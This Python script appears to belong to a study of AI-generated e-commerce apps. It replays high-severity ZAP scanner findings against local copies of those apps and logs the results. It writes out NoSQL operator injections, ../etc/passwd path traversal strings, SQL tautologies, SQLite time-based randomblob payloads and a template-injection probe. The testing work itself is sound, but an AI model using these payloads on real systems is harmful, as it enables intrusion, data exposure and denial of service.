#!/usr/bin/env python3
"""
08-validar-high.py - Reproducao manual dos achados de severidade ALTA.

    python3 08-validar-high.py <modelo>

Pre-condicao: aplicacao do modelo de pe na 5173, banco restaurado ao
snapshot varrido (04-preparar.sh <modelo> restaurar). O script ALTERA o
banco (cria pedidos, categorias, muda e-mail/endereco); restaure o
snapshot depois de rodar.

Nao altera a aplicacao. Registra cada requisicao em
out/_validacao/<modelo>.log e as observacoes em out/_validacao/<modelo>.json.
"""
import json, os, random, re, statistics, string, subprocess, sys, time
import urllib.request, urllib.error, urllib.parse

BASE = "http://localhost:5173"
RAIZ = os.path.dirname(os.path.abspath(__file__))
OUTD = os.path.join(RAIZ, "out", "_validacao")
os.makedirs(OUTD, exist_ok=True)

MODELO = sys.argv[1] if len(sys.argv) > 1 else sys.exit("uso: 08-validar-high.py <modelo>")
LOG = open(os.path.join(OUTD, f"{MODELO}.log"), "w")
OBS = {}

COMPOSE = {
    "deepseek-mini-v4": ("/home/leandro/Desktop/artigo deepseek", "app", "shop"),
    "qwen-3.8-8b":      ("/home/leandro/Desktop/artigo gwen", "app", "shop"),
    "opus":             ("/home/leandro/Desktop/artigo opus", "postgres", "ecommerce"),
}


def log(*a):
    s = " ".join(str(x) for x in a)
    print(s)
    LOG.write(s + "\n")
    LOG.flush()


def rnd(n=38):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


class Sessao:
    """Cookie capturado cru do Set-Cookie e reenviado cru (atributo Secure ignorado)."""

    def __init__(self, email=None):
        self.cookie = None
        if email:
            st, _, hdr, _ = self.req("POST", "/api/auth/login",
                                     {"email": email, "password": "Test1234!"}, quiet=True)
            sc = [v for k, v in hdr if k.lower() == "set-cookie"]
            self.cookie = "; ".join(c.split(";")[0] for c in sc)
            log(f"# login {email} -> {st}, cookie={'sim' if self.cookie else 'NAO'}")
            if st != 200 or not self.cookie:
                sys.exit("!! login falhou")
            st2, _, _, _ = self.req("GET", "/api/users/me", quiet=True)
            if st2 != 200:
                sys.exit(f"!! sessao nao valida (/api/users/me -> {st2})")

    def req(self, metodo, caminho, corpo=None, quiet=False):
        dados = json.dumps(corpo).encode() if corpo is not None else None
        r = urllib.request.Request(BASE + caminho, data=dados, method=metodo)
        if dados is not None:
            r.add_header("Content-Type", "application/json")
        if self.cookie:
            r.add_header("Cookie", self.cookie)
        t0 = time.perf_counter()
        try:
            with urllib.request.urlopen(r, timeout=60) as resp:
                st, texto, hdr = resp.status, resp.read().decode(errors="replace"), resp.getheaders()
        except urllib.error.HTTPError as e:
            st, texto, hdr = e.code, e.read().decode(errors="replace"), e.headers.items()
        ms = (time.perf_counter() - t0) * 1000
        if not quiet:
            c = json.dumps(corpo, ensure_ascii=False) if corpo is not None else ""
            log(f"  {metodo} {caminho} {c[:220]}\n    -> {st} {ms:.0f}ms {texto[:300]}")
        try:
            js = json.loads(texto)
        except ValueError:
            js = None
        return st, js, hdr, ms


def psql(sql):
    d, u, db = COMPOSE[MODELO]
    cmd = ["docker", "compose", "-f", f"{d}/docker-compose.yml", "-f", f"{d}/docker-compose.dast.yml",
           "exec", "-T", "db", "psql", "-U", u, "-d", db, "-At", "-c", sql]
    out = subprocess.run(cmd, capture_output=True, text=True).stdout.strip()
    log(f"  SQL> {sql}\n    = {out[:400]}")
    return out


def backend_log(desde="2m", padrao=None):
    d, _, _ = COMPOSE[MODELO]
    cmd = ["docker", "compose", "-f", f"{d}/docker-compose.yml", "-f", f"{d}/docker-compose.dast.yml",
           "logs", "--no-log-prefix", "--since", desde, "backend"]
    out = subprocess.run(cmd, capture_output=True, text=True).stdout
    linhas = [l for l in out.splitlines() if not padrao or re.search(padrao, l, re.I)]
    for l in linhas[-6:]:
        log(f"  BACKEND> {l[:300]}")
    return linhas


def tem_arquivo(texto):
    """Sinais de conteudo de arquivo/codigo no corpo da resposta."""
    return bool(re.search(r"root:x:0:0|<\?php|require\(|import .* from|module\.exports", texto or ""))


def temporal(s, caminho, montar, param, payloads, n=5):
    """Intercala controle (literal aleatorio, como o ZAP) e payload; compara tempos."""
    log(f"\n## TEMPO {caminho} param={param}")
    res = {}
    for p in payloads:
        ctl, pay, sts = [], [], set()
        for _ in range(n):
            st, _, _, ms = s.req("POST", caminho, montar(param, rnd(8)), quiet=True); ctl.append(ms); sts.add(st)
            st, _, _, ms = s.req("POST", caminho, montar(param, p), quiet=True); pay.append(ms); sts.add(st)
        r = {"payload": p, "controle_ms": [round(x) for x in ctl], "payload_ms": [round(x) for x in pay],
             "mediana_controle": round(statistics.median(ctl)), "mediana_payload": round(statistics.median(pay)),
             "status": sorted(sts)}
        log(f"  payload={p!r}\n    status={r['status']} controle={r['controle_ms']} (med {r['mediana_controle']})"
            f"\n    payload ={r['payload_ms']} (med {r['mediana_payload']})")
        res[p] = r
    return res


# ------------------------------------------------------------------ deepseek
def deepseek():
    user, admin = Sessao("user@test.com"), Sessao("admin@test.com")

    log("\n## D1 NoSQL Injection - MongoDB | GET /api/products search")
    o = {}
    for rotulo, qs in [("sem_busca", ""), ("literal_inexistente", "search=zzzz_inexistente"),
                       ("payload_zap_regex", "search%5B%24regex%5D=.*"),
                       ("payload_ne", "search%5B%24ne%5D=zzzz_inexistente")]:
        st, js, _, _ = user.req("GET", f"/api/products?page=1&pageSize=12&{qs}")
        o[rotulo] = {"status": st, "total": (js or {}).get("total")}
    OBS["D1"] = o

    log("\n## D2/D8 Path Traversal + Source Code Disclosure | PUT /api/admin/products/1 category_id")
    o = {}
    for rotulo, v in [("zap_1", "1"), ("aleatorio", rnd()), ("etc_passwd", "../../../../../../etc/passwd"),
                      ("etc_passwd_abs", "/etc/passwd"), ("codigo_fonte", "index.js"), ("categoria_2", "2")]:
        st, js, _, _ = admin.req("PUT", "/api/admin/products/1", {"category_id": v})
        o[rotulo] = {"status": st, "arquivo_no_corpo": tem_arquivo(json.dumps(js))}
    o["backend"] = backend_log("1m", r"invalid input syntax|error")
    OBS["D2_D8"] = o

    log("\n## D3 SQL Injection | POST /api/admin/products name (evidencia 500)")
    o = {}
    base = {"description": "validacao", "price_cents": 100, "stock": 1, "category_id": 1}
    for rotulo, nome in [("aspa_1a", "'"), ("aspa_2a", "'"), ("sem_aspa_1a", "produto-validacao"),
                         ("sem_aspa_2a", "produto-validacao")]:
        st, js, _, _ = admin.req("POST", "/api/admin/products", {**base, "name": nome})
        o[rotulo] = st
    o["backend"] = backend_log("1m", r"duplicate|unique|syntax")
    o["db"] = psql("SELECT id, name FROM products WHERE name IN ('''', 'produto-validacao') ORDER BY id;")
    OBS["D3"] = o

    log("\n## D4 SQL Injection (booleana) | PUT /api/users/me email")
    o = {}
    for rotulo, v in [("zap_pct", "user@test.com%"), ("zap_xyz", "user@test.comXYZABCDEFGHIJ"),
                      ("coringa_que_casaria_admin", "admin@test.co%"), ("email_do_admin", "admin@test.com"),
                      ("restaura", "user@test.com")]:
        st, js, _, _ = user.req("PUT", "/api/users/me", {"email": v})
        o[rotulo] = {"status": st, "email_resposta": ((js or {}).get("user") or {}).get("email")}
    o["db"] = psql("SELECT id, email FROM users ORDER BY id;")
    OBS["D4"] = o

    log("\n## D5-D7 SQL Injection - SQLite (Time Based) | POST /api/checkout")
    user.req("POST", "/api/cart/items", {"product_id": 2, "quantity": 1})
    addr = {"line1": "Rua Teste 100", "line2": "Apto 1", "city": "Porto Alegre", "state": "RS",
            "postalCode": "90000000", "country": "BR"}
    montar = lambda p, v: {"address": {**addr, p: v}}
    big = "case randomblob(1000000000) when not null then 1 else 1 end "
    pipe_s = "' | case randomblob(100000) when not null then \"\" else \"\" end | '"
    o = {"city": temporal(user, "/api/checkout", montar, "city", [big, pipe_s]),
         "line2": temporal(user, "/api/checkout", montar, "line2",
                           [pipe_s, "case randomblob(100000) when not null then 1 else 1 end "]),
         "postalCode": temporal(user, "/api/checkout", montar, "postalCode",
                                ["\" | case randomblob(1000000) when not null then \"\" else \"\" end | \""])}
    o["db"] = psql("SELECT id, city, address_line2, postal_code FROM orders WHERE city LIKE '%randomblob%' "
                   "OR address_line2 LIKE '%randomblob%' OR postal_code LIKE '%randomblob%' ORDER BY id DESC LIMIT 3;")
    OBS["D5_D7"] = o


# ------------------------------------------------------------------ opus
def opus():
    user, admin = Sessao("user@test.com"), Sessao("admin@test.com")
    prod_carrinho = "962889b8-7f1b-46d9-a75d-aa2ac46c294c"

    log("\n## O1/O5 Path Traversal + Source Code Disclosure | PUT /api/users/me postalCode")
    o = {}
    for rotulo, v in [("zap_me", "me"), ("aleatorio_38", rnd(38)), ("aleatorio_30", rnd(30)),
                      ("etc_passwd", "../../../../etc/passwd"), ("restaura", "90000000")]:
        st, js, _, _ = user.req("PUT", "/api/users/me", {"name": "Usuario Comum", "address": {"postalCode": v}})
        o[rotulo] = {"status": st, "arquivo_no_corpo": tem_arquivo(json.dumps(js)),
                     "erro": (js or {}).get("details") if st >= 400 else None}
    OBS["O1_O5"] = o

    user.req("POST", "/api/cart/items", {"productId": prod_carrinho, "quantity": 1})
    ship = {"name": "Usuario Comum", "line1": "Rua Teste 100", "line2": "Apto 1", "city": "Porto Alegre",
            "state": "RS", "postalCode": "90000000", "country": "BR", "phone": "51999990000"}
    montar = lambda p, v: {"shipping": {**ship, p: v}}

    log("\n## O2 Path Traversal | POST /api/checkout postalCode")
    o = {}
    for rotulo, v in [("zap_checkout", "checkout"), ("aleatorio_38", rnd(38)), ("etc_passwd", "../../../../etc/passwd")]:
        st, js, _, _ = user.req("POST", "/api/checkout", montar("postalCode", v))
        o[rotulo] = {"status": st, "arquivo_no_corpo": tem_arquivo(json.dumps(js)),
                     "erro": (js or {}).get("details") if st >= 400 else None}
    OBS["O2"] = o

    log("\n## O3 SQL Injection (booleana) | POST /api/admin/categories name")
    o = {}
    for rotulo, v in [("original", "cIZdRKLO"), ("zap_pct", "cIZdRKLO%"), ("zap_xyz", "cIZdRKLOXYZABCDEFGHIJ"),
                      ("tautologia", "cIZdRKLO' OR '1'='1")]:
        st, js, _, _ = admin.req("POST", "/api/admin/categories", {"name": v})
        o[rotulo] = {"status": st, "categoria": (js or {}).get("category")}
    o["db"] = psql("SELECT id, name, slug FROM categories WHERE slug LIKE 'cizdrklo%' ORDER BY created_at;")
    OBS["O3"] = o

    log("\n## O4 Source Code Disclosure | PUT /api/admin/products/{id} categoryId")
    pid = "8c45b506-5b0c-4eb2-bd0f-33cfd761ab97"
    st, js, _, _ = user.req("GET", f"/api/products/{pid}")
    p = (js or {}).get("product") or {}
    _, cats, _, _ = user.req("GET", "/api/categories")
    cat_valida = ((cats or {}).get("categories") or [{}])[0].get("id")
    corpo = {"name": p.get("name"), "description": p.get("description") or "", "price": p.get("price"),
             "stock": p.get("stock"), "imageUrl": p.get("imageUrl"), "active": True}
    o = {}
    for rotulo, v in [("zap_uuid_do_produto", pid), ("aleatorio_38", rnd(38)), ("categoria_valida", cat_valida),
                      ("etc_passwd", "../../../../etc/passwd")]:
        st, js, _, _ = admin.req("PUT", f"/api/admin/products/{pid}", {**corpo, "categoryId": v})
        o[rotulo] = {"status": st, "arquivo_no_corpo": tem_arquivo(json.dumps(js)),
                     "erro": (js or {}).get("code") or (js or {}).get("error") if st >= 400 else None}
    OBS["O4"] = o

    log("\n## O6-O8 SQL Injection - SQLite (Time Based) | POST /api/checkout")
    big = "case randomblob(1000000000) when not null then 1 else 1 end "
    o = {"country": temporal(user, "/api/checkout", montar, "country",
                             ["' | case randomblob(10000000) when not null then \"\" else \"\" end | '", big]),
         "line1": temporal(user, "/api/checkout", montar, "line1",
                           ["' | case randomblob(100000000) when not null then \"\" else \"\" end | '", big]),
         "name": temporal(user, "/api/checkout", montar, "name",
                          ["case randomblob(10000000) when not null then 1 else 1 end ", big])}
    OBS["O6_O8"] = o

    log("\n## O9 Server Side Template Injection | POST /api/checkout country")
    pay = "zj{{17700|add:81210}}zj"
    st, js, _, _ = user.req("POST", "/api/checkout", montar("country", pay))
    st2, _, _, _ = user.req("GET", "/api/orders", quiet=True)
    texto = urllib.request.urlopen(urllib.request.Request(BASE + "/api/orders", headers={"Cookie": user.cookie})).read().decode()
    ocorr = [texto[max(0, m.start() - 20):m.end() + 20] for m in re.finditer("98910", texto)]
    fora_uuid = [c for c in ocorr if not re.search(r"[0-9a-f-]{8,}98910|98910[0-9a-f-]{4,}", c)]
    literal = texto.count(pay)
    log(f"  /api/orders: payload literal {literal}x; '98910' {len(ocorr)}x; fora de UUID {len(fora_uuid)}x")
    for c in ocorr:
        log(f"    contexto: {c!r}")
    zap = json.load(open(os.path.join(RAIZ, "out", "opus-user_comum.json")))
    ctx_zap = []
    for s in zap["site"]:
        for a in s["alerts"]:
            if a["pluginid"] == "90035":
                for i in a["instances"]:
                    ctx_zap += [i["otherinfo"][max(0, m.start() - 40):m.end() + 20]
                                for m in re.finditer("98910", i["otherinfo"])]
    for c in ctx_zap:
        log(f"    contexto na prova do ZAP: {c!r}")
    OBS["O9"] = {"checkout": st, "payload_literal": literal, "ocorrencias_98910": ocorr,
                 "fora_de_uuid": fora_uuid, "contexto_prova_zap": ctx_zap}


# ------------------------------------------------------------------ qwen
def qwen():
    user = Sessao("user@test.com")
    log("\n## Q1 Source Code Disclosure - File Inclusion | PUT /api/cart/items/{id} quantity")
    st, js, _, _ = user.req("GET", "/api/cart")
    if not (js or {}).get("items"):
        user.req("POST", "/api/cart/items", {"product_id": 9, "quantity": 1})
        st, js, _, _ = user.req("GET", "/api/cart")
    item = js["items"][0]["id"]
    o = {"item": item}
    for rotulo, v in [("zap_id_do_item", str(item)), ("aleatorio_38", rnd()), ("um", "1"),
                      ("etc_passwd", "../../../../etc/passwd")]:
        st, js, _, _ = user.req("PUT", f"/api/cart/items/{item}", {"quantity": v})
        o[rotulo] = {"status": st, "arquivo_no_corpo": tem_arquivo(json.dumps(js)),
                     "erro": (js or {}).get("error") if st >= 400 else None}
    OBS["Q1"] = o


{"deepseek-mini-v4": deepseek, "opus": opus, "qwen-3.8-8b": qwen}[MODELO]()
json.dump(OBS, open(os.path.join(OUTD, f"{MODELO}.json"), "w"), indent=2, ensure_ascii=False)
log(f"\n# observacoes em out/_validacao/{MODELO}.json")
